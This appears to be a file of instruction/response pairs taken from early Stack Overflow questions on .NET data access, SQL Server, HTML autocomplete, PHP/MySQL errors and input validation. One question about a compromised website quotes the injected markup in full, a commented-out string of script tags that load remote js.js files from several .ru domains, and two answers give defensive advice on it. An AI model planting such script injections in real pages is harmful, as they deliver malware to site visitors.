{"instruction": "I currently use a DataTable to get results from a database which I can use in my code.\nHowever, many example on the web show using a DataSet instead and accessing the table(s) through the collections method.\nIs there any advantage, performance wise or otherwise, of using DataSets or DataTables as a storage method for SQL results?", "output": "It really depends on the sort of data you're bringing back.  Since a DataSet is (in effect) just a collection of DataTable objects, you can return multiple distinct sets of data into a single, and therefore more manageable, object.  \nPerformance-wise, you're more likely to get inefficiency from unoptimized queries than from the \"wrong\" choice of .NET construct.  At least, that's been my experience."}
{"instruction": "I currently use a DataTable to get results from a database which I can use in my code.\nHowever, many example on the web show using a DataSet instead and accessing the table(s) through the collections method.\nIs there any advantage, performance wise or otherwise, of using DataSets or DataTables as a storage method for SQL results?", "output": "One feature of the DataSet is that if you can call multiple select statements in your stored procedures, the DataSet will have one DataTable for each."}
{"instruction": "I want to be able to do:For Each thing In things\r\nEnd For\r\n\nCLASSIC ASP - NOT .NET!", "output": "Whatever your [things] are need to be written outside of VBScript.\nIn VB6, you can write a Custom Collection class, then you'll need to compile to an ActiveX DLL and register it on your webserver to access it."}
{"instruction": "What's the simplest way to connect and query a database for a set of records in C#?", "output": "This is an alternative way (DataReader is faster than this one):\nstring s = \"\";SqlConnection conn = new SqlConnection(\"Server=192.168.1.1;Database=master;Connect Timeout=30;User ID=foobar;Password=raboof;\");SqlDataAdapter da = new SqlDataAdapter(\"SELECT TOP 5 name, dbid FROM sysdatabases\", conn);DataTable dt = new DataTable();da.Fill(dt);for (int i = 0; i < dt.Rows.Count; i++){    s += dt.Rows[i][\"name\"].ToString() + \" -- \" + dt.Rows[i][\"dbid\"].ToString() + \"\\n\";}MessageBox.Show(s);"}
{"instruction": "I want to get the MD5 Hash of a string value in SQL Server 2005. I do this with the following command:\nSELECT HashBytes('MD5', 'HelloWorld')\n\nHowever, this returns a VarBinary instead of a VarChar value. If I attempt to convert 0x68E109F0F40CA72A15E05CC22786F8E6 into a VarChar I get h\u00e1 \u00f0\u00f4\u00a7*\u00e0\\\u00c2'\u2020\u00f8\u00e6 instead of 68E109F0F40CA72A15E05CC22786F8E6.\nIs there any SQL-based solution?\nYes", "output": "I have found the solution else where:\nSELECT SUBSTRING(master.dbo.fn_varbintohexstr(HashBytes('MD5', 'HelloWorld')), 3, 32)"}
{"instruction": "How do you disable autocomplete in the major browsers for a specific input (or form field)?", "output": "Firefox 30 ignores autocomplete=\"off\" for passwords, opting to prompt the user instead whether the password should be stored on the client. Note the following commentary from May 5, 2014:\n\n\nThe password manager always prompts if it wants to save a password. Passwords are not saved without permission from the user.\nWe are the third browser to implement this change, after IE and Chrome.\n\n\nAccording to Mozilla developer documentation the form element attribute autocomplete prevents form data from being cached in older browsers.\n<input type=\"text\" name=\"foo\" autocomplete=\"off\" />"}
{"instruction": "How do you disable autocomplete in the major browsers for a specific input (or form field)?", "output": "<form autocomplete=\"off\" ...\nwas a none standard way to do this (I think mozilla and IE still support it) but messing with the users expectations is normally a bad idea.  \nIf the user enters their credit card details into a form and then let's someone else use that browser it's not your concern :)"}
{"instruction": "How do you disable autocomplete in the major browsers for a specific input (or form field)?", "output": "Use a non-standard name and id for the fields, so rather than \"name\" have \"name_\". Browsers will then not see it as being the name field. The best part about it is that you can do this to some but not all fields and it will autocomplete some but not all fields."}
{"instruction": "How do you disable autocomplete in the major browsers for a specific input (or form field)?", "output": "<form name=\"form1\" id=\"form1\" method=\"post\" \n      autocomplete=\"off\" action=\"http://www.example.com/form.cgi\">\n\nThis will work in IE and FF, the downside is that it is not XHTML standard."}
{"instruction": "How do you disable autocomplete in the major browsers for a specific input (or form field)?", "output": "Just set autocomplete=\"off\". There is a very good reason for doing this: You want to provide your own autocomplete functionality!"}
{"instruction": "What are good libraries for C with datastructures like vectors, deques, stacks, hashmaps, treemaps, sets, etc.? Plain C, please, and platform-independent.", "output": "As always, Google is your friend:\nhttp://nixbit.com/cat/programming/libraries/c-generic-library/\nspecifically:\nhttp://nixbit.com/cat/programming/libraries/generic-data-structures-library/"}
{"instruction": "A quick glance at the present-day internet would seem to indicate that Adobe Flash is the obvious choice for embedding video in a web page.  Is this accurate, or are they other effective choices?  Does the choice of ASP.NET as a platform influence this decision?", "output": "Flash is certainly the most ubiquitous and portable solution.  98% of browsers have Flash installed.  Other alternatives are Quicktime, Windows Media Player, or even Silverlight (Microsoft's Flash competitor, which can be used to embed several video formats).\nI would recommend using Flash (and it's FLV video file format) for embedding your video unless you have very specific requirements as far as video quality or DRM."}
{"instruction": "A quick glance at the present-day internet would seem to indicate that Adobe Flash is the obvious choice for embedding video in a web page.  Is this accurate, or are they other effective choices?  Does the choice of ASP.NET as a platform influence this decision?", "output": "Flash is usually the product of choice: Everyone has it, and using the JW FLV Player makes it relatively easy on your side.\nAs for other Video Formats, there are WMV and QuickTime, but the players are rather \"heavy\", not everyone might have them and they feel so 1990ish...\nReal Player... Don't let me even start ranting about that pile of ...\nThe only other alternative of Flash that I would personally consider is Silverlight, which allows streaming WMV Videos. I found the production of WMV much better and easier than FLV because all Windows FLV Encoders I tried are not really good and stable, whereas pretty much every tool can natively output WMV. The problem with Silverlight is that no one has that Browser Plugin (yet?). There is also a player from JW."}
{"instruction": "A quick glance at the present-day internet would seem to indicate that Adobe Flash is the obvious choice for embedding video in a web page.  Is this accurate, or are they other effective choices?  Does the choice of ASP.NET as a platform influence this decision?", "output": "I have worked for a company that developed a system for distributing media content to dedicated \"players\". It was web based and used ASP.NET technology and have tried almost every possible media format you can think of and your choice really comes down to asking yourself:\ndoes it needs to play directly out of the box, or can I make sure that the components required to play the videos can be installed beforehand?\nIf your answer is that it needs to play out of the box then really your only option is flash (I know that it is not installed by default, but most will already have it installed)\nIf it is not a big issue that extra components are needed then you can go with formats that are supported by windows media player\nThe reason why windows media player falls into the second option is because for some browsers and some formats extra components must be installed.\nWe had the luxury that the \"players\" were provided by us, so we could go for the second option, however even we tried to convert as much as possible back to flash because it handles way better than windows media player"}
{"instruction": "What are good libraries for C with datastructures like vectors, deques, stacks, hashmaps, treemaps, sets, etc.? Plain C, please, and platform-independent.", "output": "The Glib library used on the Gnome project may also be some use. Moreover it is pretty well tested.\nIBM developer works has a good tutorial on its use: Manage C data using the GLib collections"}
{"instruction": "I just found /n softwares free Powershell NetCmdlets, and after playing with them I love the functionality they bring to the command line.  So it raises the question what are your favorite Cmdlets, and how do you use them?", "output": "While semi-related to your question, it does not entirely fit the Powershell NetCmdlets motif. But I wanted to post it anyhow as I use it daily and it may help others. Simply making shift-control-c key combo into displaying the visual studio command prompt."}
{"instruction": "I'm wondering if it's a good idea to make verifications in getters and setters, or elsewhere in the code.\nThis might surprise you be when it comes to optimizations and speeding up the code, I think you should not make verifications in getters and setters, but in the code where you're updating your files or database. Am I wrong?", "output": "Validation should be captured separately from getters or setters in a validation method.  That way if the validation needs to be reused across multiple components, it is available.\nWhen the setter is called, such a validation service should be utilized to sanitize input into the object.  That way you know all information stored in an object is valid at all times.\nYou don't need any kind of validation for the getter, because information on the object is already trusted to be valid.\nDon't save your validation until a database update!! It is better to fail fast."}
{"instruction": "I'm wondering if it's a good idea to make verifications in getters and setters, or elsewhere in the code.\nThis might surprise you be when it comes to optimizations and speeding up the code, I think you should not make verifications in getters and setters, but in the code where you're updating your files or database. Am I wrong?", "output": "From the perspective of having the most maintainable code, I think you should do as much validation as you can in the setter of a property. This way you won't be caching or otherwise dealing with invalid data.\nAfter all, this is what properties are meant for. If all you have is a bunch of properties like...\npublic string Name\r\n{\r\n    get\r\n    {\r\n        return _name;\r\n    }\r\n    set\r\n    {\r\n        _name = value;\r\n    }\r\n}\r\n\n... they might as well be fields"}
{"instruction": "I'm wondering if it's a good idea to make verifications in getters and setters, or elsewhere in the code.\nThis might surprise you be when it comes to optimizations and speeding up the code, I think you should not make verifications in getters and setters, but in the code where you're updating your files or database. Am I wrong?", "output": "It depends.\nGenerally, code should fail fast. If the value can be set by multiple points in the code and you validate only on after retrieving the value, the bug appears to be in the code that does the update. If the setters validate the input, you know what code is trying to set invalid values."}
{"instruction": "I'm wondering if it's a good idea to make verifications in getters and setters, or elsewhere in the code.\nThis might surprise you be when it comes to optimizations and speeding up the code, I think you should not make verifications in getters and setters, but in the code where you're updating your files or database. Am I wrong?", "output": "Well, one of the reaons why classes usually contain private members with public getters/setters is exactly because they can verify data.\nIf you have a Number than can be between 1 and 100, i would definitely put something in the setter that validates that and then maybe throw an exception that is being caught by the code. The reason is simple: If you don't do it in the setter, you have to remember that 1 to 100 limitation every time you set it, which leads to duplicated code or when you forget it, it leads to an invalid state.\nAs for performance, i'm with Knuth here:\n\n\"We should forget about small efficiencies, say about 97% of the time: premature optimization is the root of all evil.\""}
{"instruction": "I'm wondering if it's a good idea to make verifications in getters and setters, or elsewhere in the code.\nThis might surprise you be when it comes to optimizations and speeding up the code, I think you should not make verifications in getters and setters, but in the code where you're updating your files or database. Am I wrong?", "output": "You might wanna check out Domain Driven Design, by Eric Evans. DDD has this notion of  a Specification:\n\n... explicit predicate-like VALUE\r\n  OBJECTS for specialized purposes. A\r\n  SPECIFICATION is a predicate that\r\n  determines if an object does or does\r\n  not satisfy some criteria.\n\nI think failing fast is one thing, the other is where to keep the logic for validation. The domain is the right place to keep the logic and I think a Specification Object or a validate method on your Domain objects would be a good place."}
{"instruction": "When working on ASP.NET 1.1 projects I always used the Global.asax to catch all errors. I'm looking for a similar way to catch all exceptions in a Windows Forms user control, which ends up being a hosted IE control. What is the proper way to go about doing something like this?", "output": "You need to handle the System.Windows.Forms.Application.ThreadException event for Windows Forms. This article really helped me: http://bytes.com/forum/thread236199.html."}
{"instruction": "Let's say that we have an ARGB color:\nColor argb = Color.FromARGB(127, 69, 12, 255); //Light Urple.\n\nWhen this is painted on top of an existing color, the colors will blend. So when it is blended with white, the resulting color is Color.FromARGB(255, 162, 133, 255);\nThe solution should work like this:\nColor blend = Color.White; \nColor argb = Color.FromARGB(127, 69, 12, 255); //Light Urple.      \nColor rgb = ToRGB(argb, blend); //Same as Color.FromARGB(255, 162, 133, 255);\n\nWhat is ToRGB's implementation?", "output": "It's called alpha blending.\nIn psuedocode, assuming the background color (blend) always has 255 alpha. Also assumes alpha is 0-255.\nalpha=argb.alpha()r = (alpha/255)*argb.r() + (1 - alpha/255)*blend.r()g = (alpha/255)*argb.g() + (1 - alpha/255)*blend.g()b = (alpha/255)*argb.b() + (1 - alpha/255)*blend.b()\nnote: you probably need to be a bit (more) careful about floating-point/int math and rounding issues, depending on language. Cast intermediates accordingly\nEdited to add:\nIf you don't have a background color with an alpha of 255, the algebra gets alot more complicated. I've done it before and it's a fun exercise left to the reader (if you really need to know, ask another question :). \nIn other words, what color C blends into some background the same as blending A, then blending B. This is sort of like calculating A+B (which isn't the same as B+A)."}
{"instruction": "When working on ASP.NET 1.1 projects I always used the Global.asax to catch all errors. I'm looking for a similar way to catch all exceptions in a Windows Forms user control, which ends up being a hosted IE control. What is the proper way to go about doing something like this?", "output": "If you're using VB.NET, you can tap into the very convenient ApplicationEvents.vb.  This file comes for free with a VB.NET WinForms project and contains a method for handling unhandled exceptions.\nTo get to this nifty file, it's \"Project Properties >> Application >> Application Events\"\nIf you're not using VB.NET, then yeah, it's handling Application.ThreadException."}
{"instruction": "When working on ASP.NET 1.1 projects I always used the Global.asax to catch all errors. I'm looking for a similar way to catch all exceptions in a Windows Forms user control, which ends up being a hosted IE control. What is the proper way to go about doing something like this?", "output": "Currently in my winforms app I have handlers for Application.ThreadException, as above, but also AppDomain.CurrentDomain.UnhandledException\nMost exceptions arrive via the ThreadException handler, but the AppDomain one has also caught a few in my experience"}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "xUnit.net looks like it provides a slightly different approach to N/MB/MS/Unit, which is interesting.\nIn my search for an rspec-like solution (because I LOVE the rspec), I also came across NSpec, which looks a bit wordy, but combined with the NSpec Extensions addon to use C#3 extension methods, it looks pretty nice."}
{"instruction": "How do I page results in SQL Server 2005?\nI tried it in SQL Server 2000, but there was no reliable way to do this. I'm now wondering if SQL Server 2005 has any built in method?\nWhat I mean by paging is, for example, if I list users by their username, I want to be able to only return the first 10 records, then the next 10 records and so on.\nAny help would be much appreciated.", "output": "You can use the Row_Number() function.\nIts used as follows:\nSELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName\nFROM Users\n\nFrom which it will yield a result set with a RowID field which you can use to page between.\nSELECT * \nFROM \n    ( SELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName\n      FROM Users \n    ) As RowResults\nWHERE RowID Between 5 AND 10\n\netc"}
{"instruction": "How do I page results in SQL Server 2005?\nI tried it in SQL Server 2000, but there was no reliable way to do this. I'm now wondering if SQL Server 2005 has any built in method?\nWhat I mean by paging is, for example, if I list users by their username, I want to be able to only return the first 10 records, then the next 10 records and so on.\nAny help would be much appreciated.", "output": "I believe you'd need to perform a separate query to accomplish that unfortionately.\nI was able to accomplish this at my previous position using some help from this page:\r\nPaging in DotNet 2.0\nThey also have it pulling a row count seperately."}
{"instruction": "I am getting the following error:\n\nAccess denied for user 'apache'@'localhost' (using password: NO)\n\nWhen using the following code:\n<?php\n\ninclude(\"../includes/connect.php\");\n\n$query = \"SELECT * from story\";\n\n$result = mysql_query($query) or die(mysql_error());\n\necho \"<h1>Delete Story</h1>\";\n\nif (mysql_num_rows($result) > 0) {\n    while($row = mysql_fetch_row($result)){\n          echo '<b>'.$row[1].'</b><span align=\"right\"><a href=\"../process/delete_story.php?id='.$row[0].'\">Delete</a></span>';\n      echo '<br /><i>'.$row[2].'</i>';\n    }\n}\nelse {\n   echo \"No stories available.\";\n}\n?>\n\nThe connect.php file contains my MySQL connect calls that are working fine with my INSERT queries in another portion of the software.  If I comment out the $result = mysql_query line, then it goes through to the else statement.  So, it is that line or the content in the if.\nI have been searching the net for any solutions, and most seem to be related to too many MySQL connections or that the user I am logging into MySQL as does not have permission.  I have checked both.  I can still perform my other queries elsewhere in the software, and I have verified that the account has the correct permissions.", "output": "Just to check, if you use just this part you get an error?\n<?php\ninclude(\"../includes/connect.php\");\n\n$query = \"SELECT * from story\";\n$result = mysql_query($query) or die(mysql_error());\n\nIf so, do you still get an error if you copy and paste one of those Inserts into this page, I am trying to see if it's local to the page or that actual line.\nAlso, can you post a copy of the connection calls (minus passwords), unless the inserts use exactly the same syntax as this example."}
{"instruction": "I am getting the following error:\n\nAccess denied for user 'apache'@'localhost' (using password: NO)\n\nWhen using the following code:\n<?php\n\ninclude(\"../includes/connect.php\");\n\n$query = \"SELECT * from story\";\n\n$result = mysql_query($query) or die(mysql_error());\n\necho \"<h1>Delete Story</h1>\";\n\nif (mysql_num_rows($result) > 0) {\n    while($row = mysql_fetch_row($result)){\n          echo '<b>'.$row[1].'</b><span align=\"right\"><a href=\"../process/delete_story.php?id='.$row[0].'\">Delete</a></span>';\n      echo '<br /><i>'.$row[2].'</i>';\n    }\n}\nelse {\n   echo \"No stories available.\";\n}\n?>\n\nThe connect.php file contains my MySQL connect calls that are working fine with my INSERT queries in another portion of the software.  If I comment out the $result = mysql_query line, then it goes through to the else statement.  So, it is that line or the content in the if.\nI have been searching the net for any solutions, and most seem to be related to too many MySQL connections or that the user I am logging into MySQL as does not have permission.  I have checked both.  I can still perform my other queries elsewhere in the software, and I have verified that the account has the correct permissions.", "output": "Does the apache user require a password to connect to the database?  If so, then the fact that it says \"using password: NO\" would lead me to believe that the code is trying to connect without a password.\nIf, however, the apache user doesn't require a password, a double-check of the permissions may be a good idea (which you mentioned you already checked).  It may still be beneficial to try executing something like this at a mysql prompt:\n\nGRANT ALL PRIVILEGES ON databasename.* to 'apache'@'localhost';\n\nThat syntax should be correct.  \nOther than that, I'm just as stumped as you are."}
{"instruction": "I am getting the following error:\n\nAccess denied for user 'apache'@'localhost' (using password: NO)\n\nWhen using the following code:\n<?php\n\ninclude(\"../includes/connect.php\");\n\n$query = \"SELECT * from story\";\n\n$result = mysql_query($query) or die(mysql_error());\n\necho \"<h1>Delete Story</h1>\";\n\nif (mysql_num_rows($result) > 0) {\n    while($row = mysql_fetch_row($result)){\n          echo '<b>'.$row[1].'</b><span align=\"right\"><a href=\"../process/delete_story.php?id='.$row[0].'\">Delete</a></span>';\n      echo '<br /><i>'.$row[2].'</i>';\n    }\n}\nelse {\n   echo \"No stories available.\";\n}\n?>\n\nThe connect.php file contains my MySQL connect calls that are working fine with my INSERT queries in another portion of the software.  If I comment out the $result = mysql_query line, then it goes through to the else statement.  So, it is that line or the content in the if.\nI have been searching the net for any solutions, and most seem to be related to too many MySQL connections or that the user I am logging into MySQL as does not have permission.  I have checked both.  I can still perform my other queries elsewhere in the software, and I have verified that the account has the correct permissions.", "output": "If indeed you are able to insert using the same connection calls, your problem most likely lies in the user \"apache\" not having SELECT permissions on the database. If you have phpMyAdmin installed you can look at the permissions for the user in the Privileges pane. phpMyAdmin also makes it very easy to modify the permissions.\nIf you only have access to the command line, you can check the permissions from the mysql database.\nYou'll probably need to do something like: \nGRANT SELECT ON myDatabase.myTable TO 'apache'@'localhost';"}
{"instruction": "I am getting the following error:\n\nAccess denied for user 'apache'@'localhost' (using password: NO)\n\nWhen using the following code:\n<?php\n\ninclude(\"../includes/connect.php\");\n\n$query = \"SELECT * from story\";\n\n$result = mysql_query($query) or die(mysql_error());\n\necho \"<h1>Delete Story</h1>\";\n\nif (mysql_num_rows($result) > 0) {\n    while($row = mysql_fetch_row($result)){\n          echo '<b>'.$row[1].'</b><span align=\"right\"><a href=\"../process/delete_story.php?id='.$row[0].'\">Delete</a></span>';\n      echo '<br /><i>'.$row[2].'</i>';\n    }\n}\nelse {\n   echo \"No stories available.\";\n}\n?>\n\nThe connect.php file contains my MySQL connect calls that are working fine with my INSERT queries in another portion of the software.  If I comment out the $result = mysql_query line, then it goes through to the else statement.  So, it is that line or the content in the if.\nI have been searching the net for any solutions, and most seem to be related to too many MySQL connections or that the user I am logging into MySQL as does not have permission.  I have checked both.  I can still perform my other queries elsewhere in the software, and I have verified that the account has the correct permissions.", "output": "Just to check, if you use just this part you get an error?\nIf so, do you still get an error if you copy and paste one of those Inserts into this >page, I am trying to see if it's local to the page or that actual line.\nAlso, can you post a copy of the connection calls (minus passwords), unless the inserts >use exactly the same syntax as this example.\n\nHere is what is in the connection.php file.  I linked to the file through an include in the same fashion as where I execute the INSERT queries elsewhere in the code.\n$conn = mysql_connect(\"localhost\", ******, ******) or die(\"Could not connect\");\nmysql_select_db(\"adbay_com_-_cms\") or die(\"Could not select database\");\n\nI will try the working INSERT query in this area to check that out.\nAs to the others posting about the password access.  I did, as stated in my first posting, check permissions.  I used phpMyAdmin to verify that the permissions for the user account I was using were correct.  And if it matters at all, apache@localhost is not the name of the user account that I use to get into the database.  I don't have any user accounts with the name apache in them at all for that matter."}
{"instruction": "My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.\nI popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): http://www.98hs.ru/js.js <-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.\nSo I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).\nI did a whois on 98hs.ru and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...\nI have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?\nHe was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to do sftp on their site. I'm thinking his username and password got intercepted?\nSo, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?\nFor the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):\n<!--script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script-->", "output": "With a six word character password, he may have been brute forced.  That is more likely than his ftp being intercepted, but it could be that too.\nStart with a stronger password. (8 characters is still fairly weak)\nSee if this link to an internet security blog is helpful."}
{"instruction": "I am getting the following error:\n\nAccess denied for user 'apache'@'localhost' (using password: NO)\n\nWhen using the following code:\n<?php\n\ninclude(\"../includes/connect.php\");\n\n$query = \"SELECT * from story\";\n\n$result = mysql_query($query) or die(mysql_error());\n\necho \"<h1>Delete Story</h1>\";\n\nif (mysql_num_rows($result) > 0) {\n    while($row = mysql_fetch_row($result)){\n          echo '<b>'.$row[1].'</b><span align=\"right\"><a href=\"../process/delete_story.php?id='.$row[0].'\">Delete</a></span>';\n      echo '<br /><i>'.$row[2].'</i>';\n    }\n}\nelse {\n   echo \"No stories available.\";\n}\n?>\n\nThe connect.php file contains my MySQL connect calls that are working fine with my INSERT queries in another portion of the software.  If I comment out the $result = mysql_query line, then it goes through to the else statement.  So, it is that line or the content in the if.\nI have been searching the net for any solutions, and most seem to be related to too many MySQL connections or that the user I am logging into MySQL as does not have permission.  I have checked both.  I can still perform my other queries elsewhere in the software, and I have verified that the account has the correct permissions.", "output": "And if it matters at all, apache@localhost is not the name of the user account that I use to get into the database. I don't have any user accounts with the name apache in them at all for that matter.\n\nIf it is saying 'apache@localhost' the username is not getting passed correctly to the MySQL connection. 'apache' is normally the user that runs the httpd process (at least on Redhat-based systems) and if no username is passed during the connection MySQL uses whomever is calling for the connection.\nIf you do the connection right in your script, not in a called file, do you get the same error?"}
{"instruction": "My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.\nI popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): http://www.98hs.ru/js.js <-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.\nSo I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).\nI did a whois on 98hs.ru and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...\nI have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?\nHe was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to do sftp on their site. I'm thinking his username and password got intercepted?\nSo, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?\nFor the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):\n<!--script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script-->", "output": "Try and gather as much information as you can. See if the host can give you a log showing all the FTP connections that were made to your account. You can use those to see if it was even an FTP connection that was used to make the change and possibly get an IP address.\nIf you're using a prepacked software like Wordpress, Drupal, or anything else that you didn't code there may be vulnerabilities in upload code that allows for this sort of modification. If it is custom built, double check any places where you allow users to upload files or modify existing files.\nThe second thing would be to take a dump of the site as-is and check everything for other modifications. It may just be one single modification they made, but if they got in via FTP who knows what else is up there.\nRevert your site back to a known good status and, if need be, upgrade to the latest version.\nThere is a level of return you have to take into account too. Is the damage worth trying to track the person down or is this something where you just live and learn and use stronger passwords?"}
